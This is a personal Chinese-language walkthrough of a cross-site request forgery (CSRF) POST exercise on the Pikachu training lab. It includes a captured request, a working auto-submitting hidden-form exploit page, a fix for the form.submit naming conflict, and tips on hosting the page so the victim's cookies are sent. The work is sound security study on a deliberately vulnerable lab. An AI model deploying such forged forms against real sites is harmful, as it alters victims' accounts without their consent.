csrf_post 和 get 的区别主要在于post的主体在请求体里，而不是暴露在url里

# csrf_post概要
pikachu靶场由docker搭建端口    8888  
恶意文件csrf.html 由python搭建临时网站  python -m http.server 8000   
在登录账户vince的情况下，访问恶意文件，则会借助用户的登录状态去发送post请求，原数据会被修改  

# 步骤
1. 先用bp抓到修改信息的请求
``` http
POST /vul/csrf/csrfpost/csrf_post_edit.php HTTP/1.1
Host: 127.0.0.1:8888
Content-Length: 69
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="139", "Not;A=Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://127.0.0.1:8888
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8888/vul/csrf/csrfpost/csrf_post_edit.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=aj6cue452cec0jpj9epntbn857
Connection: keep-alive

sex=boy&phonenum=123456&add=china&email=123456%40qq.com&submit=submit
```

2. 重要的是最后的请求体，然后构建form表单去提交这些数据
``` html
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>CSRF POST</title></head>
<body>

<form id="f" action="http://127.0.0.1:8888/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
  <input type="hidden" name="sex" value="女">
  <input type="hidden" name="phonenum" value="12345678901">
  <input type="hidden" name="add" value="hacked">
  <input type="hidden" name="email" value="hacker@pikaachu.com">
  <input type="hidden" name="submit" value="submit">
</form>

<!-- <script>document.getElementById("f").submit();</script> -->
<script>HTMLFormElement.prototype.submit.call(document.getElementById('f'));</script>
</body>
</html>
```
中间的form部分是1表单部分，负责提交数据

## 注意
提交数据的部分  form.submit 和 <input name=submit> 的两个提交是会有冲突的，导致后面的 form.submit 失效，在前面有了<input name=submit="submit"> 的情况下，JS里  form.submit往往不再是提交函数，而是指向这个输入框元素，所以导致后面的提交失效

而把submit的类型从hidden改成submit，会有一个按钮，这时候用鼠标点击，走的是浏览器自带的提交流程，而不依赖那个  document.getElementById('f').submit();

表象是把hidden改成submit，实质是从靠 JS的form.submit变成了点击按钮提交绕开了 name=”submit” 和  form.submit  的同名冲突

若继续用无按钮，自动提交

则不用 form.submit改成

```html
HTMLFormElement.prototype.submit.call(document.getElementById('f'));
```

去避免两者的冲突

3. 实现修改对方数据
在用户登录状态下打开恶意文件csrf.html即可更改用户数据  
关于如何打开csrf.html,有两种方式  
（1） 直接打开，比如在你的桌面上，你直接点开。但是这种情况我一直没有成功，可能是对于file://方式打开，更容易被认定为未登录然后被重定向。  
   搜索后的原因
   file://  和  http://  不是一种来源，被当成了高风险/特殊场景，对与cookie的管理更严格，导致没有带上cookie，导致是未登录状态，然后被重定向到了登录页面
   <img width="1277" height="930" alt="image" src="https://github.com/user-attachments/assets/ac6c05a4-42e5-4847-8c7a-4c635a822527" />
（2）用 Python 在 8000 上提供的是 http:// 页面
页面来源是 http://127.0.0.1:8000，再 POST 到 http://127.0.0.1:8888，走的是浏览器对 正常网页跨站请求 的那套规则，更容易把「给 8888 用的 Cookie」按规则带上（是否带上还受 SameSite 等影响，但通常比 file:// 正常得多）。
服务端能看到 Session → 不跳登录，直接走改资料逻辑。

   主要的区别在与前者没有带上cookie

## 实际场景
而对于实际的攻击场景，也是最采取  将恶意文件放在http://  https:// 能访问到的地址包括自己的网点、内网机、像我这样python临时起的  最为稳妥。  
用户在登录状态下，点击你伪造的链接，即可完成数据的修改


## 结尾
我当时因为csrf的攻击一直不成功，写好的csrf.html一开始有点问题，端口没写对，还有最大的问题就是触发不了，就是我上面写的  注意  的部分，困扰了很长时间，所以就那一部分做了详细的解释，希望对看这个的人能有点帮助或者一个思路，不用再去漫无目的尝试，个人wp，仅供参考，有问题请联系我一起进步，感谢




